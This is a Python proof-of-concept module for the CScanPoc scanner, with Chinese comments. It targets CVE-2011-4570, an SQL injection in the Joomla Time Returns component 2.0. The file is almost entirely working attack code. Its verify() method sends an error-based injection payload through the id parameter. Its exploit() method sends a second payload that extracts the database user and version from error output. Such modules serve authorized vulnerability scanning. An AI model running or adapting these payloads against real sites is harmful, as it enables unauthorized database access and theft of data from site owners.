# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0056'  # 平台漏洞编号
    # 漏洞名称
    name = 'Joomla Component Time Returns (com_timereturns) 2.0 - SQL Injection'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2011-11-29'  # 漏洞公布时间
    desc = '''
        Joomla!的Time Returns（com_timereturns）组件2.0版本中存在SQL注入漏洞。
        主要是对参数id过滤不严格造成的，远程攻击者可借助id参数执行任意SQL命令。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-72200'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'CVE-2011-4570'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Joomla Time Returns Componen 2.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4e2fe893-f2fc-4fb0-b8ed-67846f8ae155'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 利用的payload(利用的是floor回显报错的方式)
            payload = "1' AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(md5(1),"\
                "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YLvB'='YLvB"
            # 漏洞页面
            exploit = '/index.php?option=com_timereturns&view=timereturns&id='
            # 构造访问地址
            vulurl = arg+exploit+payload
            # 自定义的HTTP
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 尝试访问
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查是否含有特征字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
            if 'c4ca4238a0b923820dcc509a6f75849b' in resp.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "1' AND (SELECT 1222 FROM(SELECT COUNT(*),"\
                "CONCAT(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24,"\
                "FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'YLvB'='YLvB"
            exploit = "/index.php?option=com_timereturns&view=timereturns&id="
            # 提取信息的正则表达式
            pars = "\$~~~\$([_a-zA-Z0-9].*)\*\*\*(.*)\$~~~\$"
            # 构造访问地址
            vulurl = arg+exploit+payload
            # 自定义的HTTP
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 尝试访问
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查
            if 'Duplicate entry' in resp.text:
                # 尝试提取信息
                match = re.search(pars, resp.text, re.I | re.M)
                if match:
                    dbusername = match.group(1)
                    dbversion = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的数据库用户为{dbusername} 数据库版本为{dbversion}'.format(
                        target=self.target, name=self.vuln.name, dbusername=dbusername, dbversion=dbversion))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
